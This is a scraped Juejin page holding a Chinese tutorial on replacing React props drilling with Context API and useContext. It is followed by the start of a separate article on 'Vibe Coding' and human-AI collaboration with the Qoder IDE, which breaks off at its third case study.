<p>假设我们有一个应用，需要在最顶层 App 组件持有用户信息（如登录后的用户数据），然后在深层嵌套的 UserInfo 组件中显示用户名。</p>
<p>传统方式是层层通过 props 传递：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Page</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>
  );
}

<span class="hljs-comment">// views/Page.jsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}

<span class="hljs-comment">// components/Header.jsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserInfo</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}

<span class="hljs-comment">// components/UserInfo.jsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p>这种方式在层级较浅时没问题，但想象一下如果组件树更深（比如 Page → Layout → Sidebar → Header → UserInfo），就需要在每一层都添加 user prop：</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">&lt;Page <span class="hljs-attr">user</span>={user} /&gt;
&lt;Layout <span class="hljs-attr">user</span>={user} /&gt;
&lt;Sidebar <span class="hljs-attr">user</span>={user} /&gt;
&lt;Header <span class="hljs-attr">user</span>={user} /&gt;
&lt;UserInfo <span class="hljs-attr">user</span>={user} /&gt;
</code></pre>
<p>中间的 Layout、Sidebar 等组件根本不需要 user 数据，却被迫成为“快递员”。这就是典型的 Props Drilling：</p>
<ul>
<li>代码冗余，维护成本高（修改一次要改多处）。</li>
<li>中间组件耦合度增加，重构困难。</li>
<li>阅读性差，难以快速定位数据来源。</li>
</ul>
<h2 data-id="heading-1">Context API：优雅解决跨层级通信</h2>
<p>Context API 的核心思想是：<strong>数据在最外层提供，任何子组件主动消费</strong>。这样，数据持有和改变的逻辑依然在外层组件，但消费方可以直接获取，无需中间传递。</p>
<h3 data-id="heading-2">步骤一：创建 Context</h3>
<p>通常在独立文件中创建（推荐实践，便于复用和维护），但简单示例可放在 App 中。</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">import</span> { createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Page</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./views/Page'</span>;

<span class="hljs-comment">// 创建 Context，defaultValue 为 null（生产中可设为默认值）</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{user}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span>
  );
}
</code></pre>
<ul>
<li>createContext 创建一个上下文对象。</li>
<li>Provider 组件包裹需要共享数据的组件树。</li>
<li>value 属性就是共享的数据（可以是对象、函数、状态等）。</li>
</ul>
<h3 data-id="heading-3">步骤二：消费 Context</h3>
<p>在任何子组件中使用 useContext Hook 直接读取：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// components/UserInfo.jsx</span>
<span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">UserContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../App'</span>;  <span class="hljs-comment">// 根据实际路径调整</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p>中间组件无需任何修改：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// views/Page.jsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../components/Header'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span>;
}

<span class="hljs-comment">// components/Header.jsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UserInfo</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./UserInfo'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserInfo</span> /&gt;</span></span>;
}
</code></pre>
<p>效果完全相同，但代码干净多了！UserInfo 组件主动“找”数据，而不是被动接收。</p>
<h3 data-id="heading-4">完整目录结构示例</h3>
<p>text</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">src</span>/
├── App<span class="hljs-selector-class">.jsx</span>
├── views/
│   └── Page<span class="hljs-selector-class">.jsx</span>
└── components/
    ├── <span class="hljs-selector-tag">Header</span><span class="hljs-selector-class">.jsx</span>
    └── UserInfo<span class="hljs-selector-class">.jsx</span>
</code></pre>
<h2 data-id="heading-5">为什么 useContext 更优？</h2>
<ol>
<li><strong>避免 Props Drilling</strong>：中间层组件无需关心数据传递。</li>
<li><strong>数据来源清晰</strong>：消费组件直接导入 Context，一目了然。</li>
<li><strong>灵活性高</strong>：Provider 可以包裹任意子树，支持局部共享。</li>
<li><strong>性能友好</strong>（注意事项见下文）：React 会优化只重渲染实际消费的组件。</li>
</ol>
<h2 data-id="heading-6">进阶：动态更新 Context 数据</h2>
<p>单纯的对象共享已足够强大，但真实场景中用户数据往往需要更新（如登录/退出）。</p>
<p>推荐将状态和更新函数一起提供：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">import</span> { useState, createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">user</span>, <span class="hljs-attr">setUser</span> }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span>
  );
}
</code></pre>
<p>消费方：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// UserInfo.jsx</span>
<span class="hljs-keyword">const</span> { user, setUser } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

<span class="hljs-comment">// 示例：退出登录</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setUser(null)}&gt;退出<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
{user ? <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>未登录<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>}
</code></pre>
<p>这样，任何组件都能读取并修改全局用户状态。</p>
<h2 data-id="heading-7">最佳实践与注意事项</h2>
<ol>
<li>
<p><strong>单独文件管理 Context</strong>：大型项目中，将 createContext、Provider 封装成独立文件（如 UserContext.jsx），便于团队协作。</p>
</li>
<li>
<p><strong>避免频繁更新大对象</strong>：Context 使用引用相等性判断重渲染。如果每次 Provider value 都是新对象（如 {...}），会导致所有消费者重渲染。解决办法：</p>
<ul>
<li>
<p>使用 useMemo 稳定 value：</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">value</span> = useMemo(() =&gt; ({ user, setUser }), [user])<span class="hljs-comment">;</span>
&lt;Provider <span class="hljs-attr">value</span>={value}&gt;
</code></pre>
</li>
<li>
<p>或拆分多个 Context（主题、用户、配置分开）。</p>
</li>
</ul>
</li>
<li>
<p><strong>不要滥用</strong>：Context 适合“全局性”低频变化数据（如用户、主题、语言）。高频变化或复杂状态推荐 Zustand、Jotai 或 Redux。</p>
</li>
<li>
<p><strong>结合 React.memo 优化</strong>：如果消费者不依赖 Context，可用 React.memo 防止不必要重渲染。</p>
</li>
<li>
<p><strong>TypeScript 支持</strong>：createContext 时可指定类型，提升类型安全。</p>
</li>
</ol>
<h2 data-id="heading-8">实际应用场景举例</h2>
<ul>
<li><strong>用户信息</strong>：登录状态、头像、权限。</li>
<li><strong>主题切换</strong>：dark/light mode。</li>
<li><strong>国际化</strong>：当前语言包。</li>
<li><strong>布局配置</strong>：侧边栏展开状态。</li>
</ul>
<p>这些数据往往被多个深层组件使用，使用 Context 能极大简化代码。</p>
<h2 data-id="heading-9">结语</h2>
<p>Props Drilling 是 React 新手最先接触的方式，但随着项目规模增长，它会成为维护的枷锁。Context API + useContext 提供了原生、轻量级的解决方案，让跨层级通信变得优雅而高效。</p>
<p>记住核心原则：<strong>数据在外层提供，消费方主动获取</strong>。这不仅解决了 Props Drilling，还为未来扩展（如结合 Reducer 实现小型状态管理）打下基础。</p>
<p>在 2025 年的 React 生态中，Context API 依然是中小型项目全局状态管理的首选。合理使用它，你的组件树将更清晰、可维护性更强。</p>
<p>赶紧在你的项目中试试吧——从一个简单的用户上下文开始，你会爱上这种“跳跃式”数据传递的自由！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding 之道：从执行者到人机团队指挥官]]></title>    <link>https://juejin.cn/post/7589093939656228916</link>    <guid>https://juejin.cn/post/7589093939656228916</guid>    <pubDate>2025-12-29T10:19:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093939656228916" data-draft-id="7589104492882526260" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding 之道：从执行者到人机团队指挥官"/> <meta itemprop="keywords" content="VibeCoding"/> <meta itemprop="datePublished" content="2025-12-29T10:19:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里巴巴AI编程社区"/> <meta itemprop="url" content="https://juejin.cn/user/1757434193132441"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding 之道：从执行者到人机团队指挥官
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1757434193132441/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里巴巴AI编程社区
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:19:45.000Z" title="Mon Dec 29 2025 10:19:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好！我是 OneOneTalk CTO 彭超。今天分享 Vibe Coding 方法论——Vibe coding之道。</p>
<p>AI技术飞速发展的今天，软件开发正在经历一场巨大变革。 传统的编程方式正在被重新定义，开发者与代码之间的关系也在发生根本性转变。今天我们将深入探讨 Vibe Coding 这一概念，分析 AI 编程如何重塑我们的开发流程、团队协作模式以及个人职业发展路径，并分享在实际项目中的最佳实践和经验教训。</p>
<h2 data-id="heading-0">01 时代之变：从人适应机器到机器理解人</h2>
<p>Vibe Coding这一概念最早由Andrej Karpathy——OpenAI 联合创始人、特斯拉前 AI 总监提出，标志着编程范式的一次重大转折。在此之前，编程本质上是"人适应机器"的过程：开发者需要将人类的思维逻辑转化为计算机能够理解的指令，这个过程既繁琐又容易出错。</p>
<p>然而，随着大语言模型（LLM）技术的突破性进展，特别是DeepSeek等工具的出现，我们迎来了"机器理解人"的新时代。在这个新范式下，开发者不再需要精确地告诉计算机每一步该做什么，而是通过自然语言表达意图，让AI理解并执行具体的实现细节。</p>
<p>这种转变不仅仅是技术层面的革新，更是思维方式的根本性颠覆。传统的"古法编程"要求开发者亲手敲击每一行代码，对语法、逻辑、边界条件等细节都要了如指掌。这种方式虽然能够确保代码质量，但效率低下，且对开发者的技术要求极高。</p>
<p>而在AI编程时代，角色发生了根本性转变：人成为指挥者，负责表达意图和对结果负责；<strong>AI成为执行者，负责具体的实现细节。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32f0ac730a2247b484a534e4509ae2dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=P5lI13ny099x%2FARGviMEkh3dhYU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">02 协作之道：人机关系的哲学思考</h2>
<h3 data-id="heading-2">人机协作的形态</h3>
<p>回顾AI编程的发展历程，人机协作可能有以下几种形态：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdea6a0837834cdaa7928ebd84618fa5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=TwJhU27YSNN0L5ne%2F%2BBTw8Qw5A4%3D" alt="" loading="lazy"/></p>
<ul>
<li>主仆模式<br/>
开发者需要手动复制粘贴代码，在IDE和 ChatGPT 等聊天工具之间反复切换。AI的作用仅仅是回答具体问题，无法理解项目的整体上下文，更无法自主解决问题。</li>
<li>替代模式<br/>
随着Qoder等AI IDE的出现，编程Agent具备了自主规划能力。开发者只需描述问题，Agent就能自动分析、规划解决方案并执行。更重要的是，Agent能够理解模糊的指令，如"帮我修复这个"，而不需要精确的错误描述。</li>
<li>共生模式<br/>
这是我们目前所处的阶段，也是最理想的协作模式。在这种模式下，人和AI各自发挥优势，形成1+1&gt;2的协同效应。人负责提供目标、判断价值、承担责任；AI负责执行细节、处理重复工作、提供技术建议。</li>
</ul>
<h3 data-id="heading-3">协作进化的过程</h3>
<p>协作进化有以下几个过程：</p>
<ol>
<li>知己·明确边界：人的优势是创意、判断、责任、价值观、跨域思维、情感共鸣。</li>
<li>知彼理解·AI：AI的优势：速度、记忆、模式识别、不知疲倦、无情绪波动。</li>
<li>合一·人机共舞：最佳状态是人负责"为什么"和"做什么"，AI负责"怎么做"。</li>
<li>信任·但要验证：AI会犯错，人要有判断力；信任不是盲从，而是基于理解的委托。</li>
<li>迭代·对话式协作：不是一次性交付，而是持续对话；反馈-修正-优化的闭环。</li>
<li>成长·共同进化：人在协作中提升AI使用能力，AI在反馈中更懂你的意图。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0768a21cb929491c914ba4d1e1ef617e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=PuPlA9led2aWW%2FBpqwPHsOgWluI%3D" alt="" loading="lazy"/></p>
<p>尽管AI在速度、记忆、多模态识别等方面具有显著优势，但在关键领域人的作用仍然不可替代。</p>
<p>以医疗诊断为例，即使 AI 在某些特定诊断任务中的准确率已显著超过人类专家，医院仍然要求医生手动签字确认 AI 的诊断结果。这是因为AI无法承担法律责任。</p>
<p>同样的道理适用于软件开发：</p>
<ul>
<li>责任归属：最终的代码质量和系统稳定性仍需人类开发者负责。</li>
<li>价值判断：AI无法判断功能是否真正满足用户需求。</li>
<li>创新思维：真正的创新来自于人类对问题的深刻理解和独特视角。</li>
<li>伦理考量：技术应用的社会影响需要人类进行道德判断。</li>
</ul>
<p>因此，在人机协作中，我们必须明确各自的边界：人负责"为什么"和"做什么"，AI负责"怎么做"。同时，我们也要保持对AI输出的验证意识，因为AI存在"幻觉"问题，可能会生成看似合理但实际错误的内容。</p>
<h3 data-id="heading-4">提升AI使用能力的三个层次</h3>
<p>有效利用AI编程工具需要经历三个能力提升阶段：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e9714097fb04ce3bc971bbc20d7d9e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=oUQj4ugGw4%2FBbOJgoMMHo6wDRww%3D" alt="" loading="lazy"/></p>
<ol>
<li>用·把 AI 当工具<br/>
把将AI作为问答工具，进行简单的代码生成和问题解答。这是大多数开发者的起点，但效率提升有限。</li>
<li>驭·把 AI 当助手<br/>
将AI视为智能助手，运用"思维树"（Tree of Thoughts）等技巧，让AI扮演不同角色（架构师、产品经理、测试工程师）进行多轮讨论。同时，充分利用上下文信息，让AI更好地理解项目背景。<br/>
Qoder 目前支持上下文工程，你可以将上下文丢给 Qoder，让 Qoder 帮你分析，输出。还有就是复杂任务的拆解，呼吁大家都使用下 OpenSpec，让 Qoder 去拆解一些意图。我之前就是做产品经理的，可能吭哧吭哧要写一天时间，但 Qoder 只用五分钟就可以帮你拆解掉。</li>
<li>合·人机一体 理想的话就是每一个地方都有 AI ，让 AI 深度的去参与决策、执行，最终达到人机边界的模糊状态。开发者专注于高层次的决策和创新，而将具体的实现细节完全交给AI处理。</li>
</ol>
<p>道的核心是人的不可替代性，人要负责的，不是非此即彼，或者是谁取代谁，而是如何将1+1&gt;2的协同效应最大化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8bd77b80724842ba78e2fc9e69b8b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=RGkZQfHU2d9LfUahvFYmWzKNFcw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">03 实战之术：人机协作的修炼场</h2>
<p>我在多个项目中验证了 AI 编程的可行性：</p>
<h3 data-id="heading-6">案例一：修仙模拟器的快速开发</h3>
<p>我使用 Qoder 开发了一个修仙模拟器，这个应用包含角色创建、属性分配、修炼突破、天劫挑战等完整的游戏机制。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73a9d6efcb5d40218c0965a5737fd8c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=IhVWGN9rMBUH8vK3LObprt3Kgaw%3D" alt="" loading="lazy"/></p>
<p>整个开发过程具有以下特点：</p>
<ul>
<li>开发时间：不到1小时完成</li>
<li>技术栈：纯前端实现</li>
<li>代码质量：无明显的"AI味"，用户体验流畅自然</li>
</ul>
<p>在开发过程中，我采用了以下策略：</p>
<ol>
<li>明确指定使用前端技术栈和最佳实践</li>
<li>应用OpenSpec进行需求拆解和规格定义</li>
<li>充分利用Qoder的上下文理解和记忆功能</li>
<li>以效率为优先考虑，成本其次</li>
</ol>
<p>这个案例充分证明了AI编程在快速原型开发方面的巨大优势，即使是游戏这样相对复杂的交互应用，也能在极短时间内完成高质量实现。</p>
<h3 data-id="heading-7">案例二：Windows 95模拟器的完美复刻</h3>
<p>另一个案例是使用 Qoder 开发 Windows 95模拟器。这个项目实现了零修改、零报错的一次性成功。不仅重现了经典的桌面界面，还包含了完整的应用程序生态，包括：</p>
<ul>
<li>AI记事本（支持文本生成和润色）</li>
<li>扫雷等小游戏（经典Windows游戏的完整实现）</li>
<li>系统菜单和窗口管理</li>
</ul>
<p>整个系统界面看起来没有任何 Vibe Coding 的味。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0eecb4e806047ec8c5aee802a5f4a53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=lNfSErNiJf1mREjpwvGw5qDQC4U%3D" alt="" loading="lazy"/></p>
<p>这里分享一个 AI Coding 的关键技巧，就四个字：最佳实践。比如我想开发一个 Windows 95 风格的应用，我会先明确指定前端技术栈（比如 React 或 Vue），然后在指令中强调：“请结合该技术栈的最佳实践来实现”。这样一来，Qoder 生成的代码会更规范、更贴近真实工程标准。再配合 OpenSpec 的 Proposal 和 Apply 流程，基本能一次成型，大幅减少后期修改。</p>
<h3 data-id="heading-8">案例三：AI Chat 的开发</h3>
